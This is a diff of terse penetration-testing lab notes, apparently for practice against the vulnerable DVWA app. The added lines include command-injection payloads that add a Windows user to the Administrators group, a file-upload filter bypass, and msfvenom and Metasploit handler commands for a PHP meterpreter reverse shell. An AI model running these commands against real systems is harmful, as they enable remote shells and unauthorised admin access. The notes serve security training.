@@ -9,11 +9,14 @@
 		1) use auxiliary/scanner/http/wordpress_login_enum
 		2) options
 		3) run
-4) Exploiting remote command execution
+4) Exploiting remote command execution login -> set the DVWA security to low  -> issue the commands
 	1) for command injection
-		1)  |  hostname
+		1) | hostname
 		2) | whoami
 		3) | net user
+		4) | dir C:\
+		5) | net user Test /Add
+		6) | net localgroup Administrators Test /Add
 
 5) Vega 
 	1) Add IP see the vuln
@@ -25,6 +28,9 @@
 	1) all were easy 
 	2) in one at GIF98 to the end of file to upload it and rename it as upload.php.jpg
 	3) https://techsphinx.com/hacking/hacking-for-beginners-file-upload-vulnerability/
+	4) msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234
+	5) use exploit/multi/handler
+	6) show options set lhost as 10.10.10.10. set lport 1234 -> done 
 
 8) Command injection will see in paper 
 9) CSRF 
